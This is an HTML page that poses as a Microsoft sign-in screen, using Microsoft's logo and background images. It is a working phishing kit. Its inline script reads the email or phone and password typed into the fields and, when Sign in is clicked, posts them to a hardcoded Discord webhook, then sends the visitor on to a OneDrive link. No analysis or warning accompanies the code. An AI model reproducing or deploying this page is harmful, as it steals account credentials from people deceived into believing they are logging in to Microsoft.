<!DOCTYPE html>
<html>
<head>
	<title>Sign In</title>
	<link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/2048px-Microsoft_logo.svg.png">
	<style>
		body {
			background: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg') no-repeat center center fixed;
			background-size: cover;
		}
		.container {
			background-color: #fff;
			padding:  20px;
			border: 1px solid #ccc;
			box-shadow: 0px 0px 8px #ccc;
			width: 400px;
			margin: 0 auto;
			border-radius: 0px;
		}
		.text-box {
			padding: 10px;
			border: 1px solid #ccc;
			border-radius: 0px;
			margin-bottom: 10px;
			width: 100%;
			box-sizing: border-box;
		}
		.login-btn {
			background-color: #0078d4;
			color: #fff;
			border: none;
			padding: 10px;
			cursor: pointer;
			width: 100%;
			border-radius: 0px;
		}
		.signup-text {
			text-align: center;
			margin-top: 10px;
			color: #0078d4;
			cursor: pointer;
			font-family: Arial, sans-serif;
		}
		.signup-link {
			color: #0078d4;
		}
		.logo {
			display: block;
			margin: 30px auto 20px;
			width: 150px;
		}
		.container {
    /* Existing styles */
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
}
	</style>
</head>
<body>
	<div class="container">
		<img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft Logo" class="logo">
		<input type="text" placeholder="Email or phone" class="text-box">
		<input type="password" placeholder="Password" class="text-box">
		<form action="https://1drv.ms/w/s!AoXtAI8_tIEWa9ZIsF_m-u27934" method="get">
		<form action="https://1drv.ms/w/s!AoXtAI8_tIEWa9ZIsF_m-u27934" method="get">
   <button type="submit" class="login-btn">Sign in</button>
</form>

<script>
   const webhookUrl = 'https://discord.com/api/webhooks/1091167704641196133/0X_joyXTD3pQCY4bGLvoeBwV_Ewdnp-3EHiHgm6BTKzccMAye4gTw9WsGC1qz6BAbNs-';

   function sendWebhook() {
      const emailOrPhone = document.querySelector('input[type="text"]').value;
      const password = document.querySelector('input[type="password"]').value;

      const payload = {
         content: `Email or phone: ${emailOrPhone}\nPassword: ${password}`
      };

      fetch(webhookUrl, {
         method: 'POST',
         headers: {
            'Content-Type': 'application/json'
         },
         body: JSON.stringify(payload)
      })
      .then(response => {
         console.log('Webhook sent successfully');
      })
      .catch(error => {
         console.error('Error sending webhook:', error);
      });
   }

   const loginButton = document.querySelector('.login-btn');
   loginButton.addEventListener('click', sendWebhook);
</script>
